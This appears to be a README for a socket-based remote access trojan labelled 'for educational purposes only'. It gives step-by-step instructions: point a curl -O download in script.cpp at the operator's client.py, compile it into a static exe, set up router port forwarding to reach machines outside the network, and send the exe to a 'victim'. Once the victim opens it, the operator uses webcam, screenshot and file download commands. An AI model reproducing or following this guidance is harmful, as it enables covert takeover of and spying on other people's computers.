# Remote Administration Tool (RAT) Using Sockets For Educational Purposes Only

### To hack outside of network 

you have to setup an port forwarding setup by getting into your gateway settings.give the public ip (so you can hack outside the network) and port to client.py of your own system.

## STEPS

#### 1.change the link in script.cpp (in curl -O command )to your client.py.

#### 2.make exe of script.cpp using cmake or g++.(preferred cmake)
```
g++ -o script.exe script.cpp
g++ -o -static script.exe script.cpp \\ This one will run in any system even g++ is not installed
```

#### 3.setup an port forwarding setup 
checking your gateway thourgh ipconfig command and enter gateway ip into web broswer enter you router username and password and go to port forwarding 
section select internal ip as your system ip in which you will run server.py and give port internal and external 1235 or any you want to use.

#### 4.Now send exe to any person with consent and start listening by running server.py

#### 5.when victim open exe you will get his access

#### 6.you can use commands like 
```python
webcam filename
ss filename
download filename #download command not work properly
```
